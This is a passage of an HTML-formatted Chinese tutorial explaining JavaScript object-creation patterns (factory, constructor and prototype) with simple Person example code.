&nbsp;&nbsp;age:<span class=\"\" style=\"color: rgb(0, 102, 102);\">29</span>,<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;job:<span class=\"\" style=\"color: rgb(0, 136, 0);\">“shayemuyou”</span>,<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;sayName:<span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp;}<br>}</span></code></pre><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个例子中的<span style=\"color: rgb(0, 128, 255);\">person</span>对象和前面的对象是一样的，都有相同的属性和方法。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然<span style=\"color: rgb(0, 128, 255);\">Object</span>构造函数或者对象字面量的方法都可以用来创建单个对象，但是这些方法有个明显的缺点：使用同一个接口创建很多对象，会产生大量的重复代码。为了解决这个方法，人们开始使用工厂模式的一种变体。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47); font-size: 14px;\"><strong><span style=\"color: rgb(247, 92, 47);\">一、工厂模式</span></strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;工厂模式是软件工程领域一种广为人知的设计模式，这种模式抽象了创建具体对象的过程</strong></span><span style=\"color: rgb(136, 136, 136);\">。考虑到ECMAScript中无法创建类，开发人员就发明了一种函数，用函数来封装以特定接口创建对象的细节，如下所示：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">createPerson</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><br> <br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.name = name; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.age = age; <br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.job = job;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;<br>&nbsp; }<br> &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> o;<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person1 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“wei”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“software”</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person2 = createPerson(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“bu”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“software”</span>);</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;函数<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>能够根据接受的参数来构建一个包含所有必要信息的<span style=\"color: rgb(0, 128, 255);\">Person</span>对象。可以多次调用这个函数，每次都会返回一个包含三个属性一个方法的对象。工厂模式虽然解决了创建多个相似对象的问题，但却没有解决对象识别的问题，即怎么样知道这是哪个对象类型。</span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>二、构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;像Array、Object这样的原生构造函数，在运行时会自动出现在执行环境中。此外，我们可以创建自定义个构造函数，从而定义自定义类型的属性和方法。例如，我们可以使用构造函数重写上个例子：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{<span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;this</span>.name = name;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.age = age;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.job = job;<br><span class=\"\" style=\"color: rgb(0, 0, 136);\"> &nbsp; &nbsp;this</span>.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;&nbsp; &nbsp;}<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">“wei”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">“software”</span>);<br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0);\">“bu”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102);\">25</span>,<span class=\"\" style=\"color: rgb(0, 136, 0);\">“software”</span>);</span></code></pre><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person()</span>函数取代了<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>函数，我们注意到<span style=\"color: rgb(0, 128, 255);\">Person()</span>与<span style=\"color: rgb(0, 128, 255);\">createPerson()</span>的不同之处在于：</span></p><ul class=\"list-paddingleft-2\"><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有显式的创建对象</span></p></li><li><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">直接将属性和方法赋值给this对象</span></p></li><li><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">没有return语句&nbsp;</span></p></section></li></ul><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此外，还应该<span style=\"color: rgb(247, 92, 47);\"><strong>注意到函数名Person使用的是大写字母P</strong></span>。按照惯例，构造函数始终都应该以一个大写字母开头，而非构造函数则应该以一个小写字母开头。这个做法借鉴了其他OO语言，主要是为了区别于ECMAScript中的其他函数。因为构造函数本身也是函数，只不过可以创建对象而已。&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;要创建一个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例，必须使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符。以上这种方式会经过以下四个步骤：&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;1、创建一个新对象</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;2、将构造函数的作用域赋给新对象（因此this指向这个新对象）</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;3、执行构造函数中的代码</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;4、返回新对象&nbsp;</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前面例子的最后，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>分别保存着<span style=\"color: rgb(0, 128, 255);\">Person</span>的一个不同的实例。这两个对象都有一个constructor（构造函数）属性，该属性指向Person。如下：</span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"color: rgb(0, 0, 136);\">log</span>(person1.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0);\">//true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">console.<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">log</span>(person2.constructor == Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对象的<span style=\"color: rgb(0, 128, 255);\">constructor</span>属性最初是用来标识对象类型的。但是，提到检测对象类型，还是<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符比较可靠一些。我们在这个例子中创建的对象都是<span style=\"color: rgb(0, 128, 255);\">Object</span>对象的实例，也是<span style=\"color: rgb(0, 128, 255);\">Person</span>对象的实例，这一点通过instanceof操作符可以验证。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Object); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2 <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">instanceof</span> Person); &nbsp; &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；而这正是构造函数模式胜过工厂模式的地方。在这个例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>之所以同是<span style=\"color: rgb(0, 128, 255);\">Object</span>的实例，是因为所有的对象都继承自Object。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造函数的主要问题，就是每个方法都要在实例上重新创建一遍，造成内存浪费。在前面的例子中，<span style=\"color: rgb(0, 128, 255);\">person1</span>和<span style=\"color: rgb(0, 128, 255);\">person2</span>都有一个名为<span style=\"color: rgb(0, 128, 255);\">sayName()</span>的方法，但是两个方法不是同一<span style=\"color: rgb(0, 128, 255);\">Function</span>的实例。不要忘了ECMAScript中的函数也是对象，因此每定义一个函数，也就是实例化了一个对象，从逻辑角度讲，此时的构造函数可以这样定义：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> <span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">Function</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“alert(this.name);”</span>) &nbsp; </span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;//与声明函数在逻辑上是等价的</span>}</span></code></p></pre></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从这个角度来看构造函数，更容易看明白每个<span style=\"color: rgb(0, 128, 255);\">Person</span>实例都会包含一个不同的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的本质。说明白些，会导致不同的作用域链和标识符解析，但是创建<span style=\"color: rgb(0, 128, 255);\">Function</span>新实例的机制仍然是相同的。因此，不同实例上的同名函数是不相等的，以下代码可以证实这一点。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">alert(person1<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span> == person2<span class=\"\" style=\"color: rgb(68, 68, 68);\">.sayName</span>)<span class=\"\" style=\"color: rgb(136, 0, 0);\">; &nbsp;//false</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然而，创建两个完成同样任务的<span style=\"color: rgb(0, 128, 255);\">Function</span>实例的确没有必要；况且有<span style=\"color: rgb(0, 128, 255);\">this</span>对象在，根本不用在执行代码前就把函数绑定到特定的对象上。因此，可以像下面这样，通过把函数定义转移到构造函数外部来解决这个问题。</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age, job)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.job = job; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.sayName = sayName;</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span> sayName<span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);<br>}</span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这样做解决了多个函数解决相同问题的问题，但是有产生了新的问题，在全局作用域中实际上只被某个对象调用，这让全局对象有点名不副实。更让人无法接受的是：如果对象需要定义很多方法，那么就要定义很多全局函数，于是我们这个自定义的引用类型就丝毫没有封装性可言了。好在这些问题可以使用原型模式来解决。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>三、原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify;\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"text-align: justify; color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们创建的每个函数都有一个<span style=\"text-align: justify; color: rgb(0, 128, 255);\">prototype</span>（原型）属性，这个属性是一个指针，指向一个对象，而这个对象的用途是包含可以由特定类型的所有实例共享的属性和方法。使用原型对象的实例就是让所有实例共享它所包含的属性和方法。换句话说，不必在构造函数中定义对象的实例信息，而是可以将这些信息直接添加到原型对象中，如下所示：</span><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br>}<br>Person.prototype.name = <span class=\"\" style=\"color: rgb(0, 136, 0);\">“wei”</span>;<br>Person.prototype.age = <span class=\"\" style=\"color: rgb(0, 102, 102);\">27</span>;<br>Person.prototype.job = <span class=\"\" style=\"color: rgb(0, 136, 0);\">“Software”</span>;<br>Person.prototype.sayName = <span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102);\">()</span>{<br> &nbsp; &nbsp;<br> &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136);\">this</span>.name);<br>}<br> <br><span class=\"\" style=\"color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136);\">new</span> Person();</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//“wei”</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\"><br>var</span> person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person();</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person2.sayName(); &nbsp; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//“wei”</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><br><span style=\"font-size: 14px;\">alert(person1.sayName == person2.sayName);</span></code></p></pre></section></section></section></section></section></section></section></section></section><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"box-sizing: border-box;\"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: 